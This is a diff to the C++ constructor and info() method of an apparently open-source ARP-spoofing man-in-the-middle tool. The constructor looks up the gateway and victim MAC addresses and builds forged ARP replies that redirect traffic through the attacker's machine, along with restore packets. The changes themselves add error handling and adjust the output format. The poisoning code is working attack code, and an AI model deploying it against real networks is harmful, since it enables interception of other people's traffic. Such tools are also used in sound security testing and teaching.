@@ -1,27 +1,41 @@
 #include "Mitm.hh"
 
 Mitm::Mitm(const NetworkInterface &iface, std::ostream *out, const std::vector<std::string> &victimsIp, const std::string &gatewayIp)
-    : ASender(iface, "Mitm", out), _run(false)
+    : ASender(iface, "Mitm", out), _run(false), _attacker(_iface.addresses().hw_addr, _iface.addresses().ip_addr)
 {
     HWAddress<6>    victimMac;
 
-    _gateway.ip(IPv4Address(gatewayIp));
-    _gateway.mac(arpRequest(_gateway.ip()));
+    try
+    {
+        _gateway.ip(IPv4Address(gatewayIp));
+        _gateway.mac(arpRequest(_gateway.ip()));
+    }
+    catch (std::runtime_error &e)
+    {
+        std::cout << std::string("Can't recover gateway mac") + e.what();
+    }
 
     for (std::string victimIp : victimsIp)
     {
-        victimMac = arpRequest(victimIp);
+        try
+        {
+            victimMac = arpRequest(victimIp);
 
-        _victims.push_back(victimIp);
+            _victims.push_back(victimIp);
 
-        // Tell gateway thats _victim.ip() is _attackerMac (sender, sender, target, target)
-        _poisonPackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), _attacker.mac()));
-        // Tell victim thats _gateway.ip() is _attackerMac
-        _poisonPackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _attacker.mac()));
-        // Tell victim thats _gateway.ip() is gatewayMac
-        _basePackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _gateway.mac()));
-        // Tell victim thats _gateway.ip() is gatewayMac
-        _basePackets.push_back(ARP::make_arp_reply( _gateway.ip(), victimIp, _gateway.mac(), victimMac));
+            // Tell gateway thats _victim.ip() is _attackerMac (sender, sender, target, target)
+            _poisonPackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), _attacker.mac()));
+            // Tell victim thats _gateway.ip() is _attackerMac
+            _poisonPackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _attacker.mac()));
+            // Tell victim thats _gateway.ip() is gatewayMac
+            _basePackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _gateway.mac()));
+            // Tell victim thats _gateway.ip() is gatewayMac
+            _basePackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), victimMac));
+        }
+        catch (std::runtime_error &e)
+        {
+            std::cout << std::string("Can't recover victim mac") + e.what();
+        }
     }
 
     // Enable ip forwarding
@@ -67,7 +81,8 @@ std::string Mitm::info(void) const
     std::stringstream   ss;
 
     for (IPv4Address ip : _victims)
-        ss << "[" << ip << "]" << " <---> " << "[" << _gateway.ip() << "]";
+        ss << "[" << ip << "] ";
+    ss << " Gateway [" << _gateway.ip() << "]" << std::endl;
     return ss.str();
 }
 
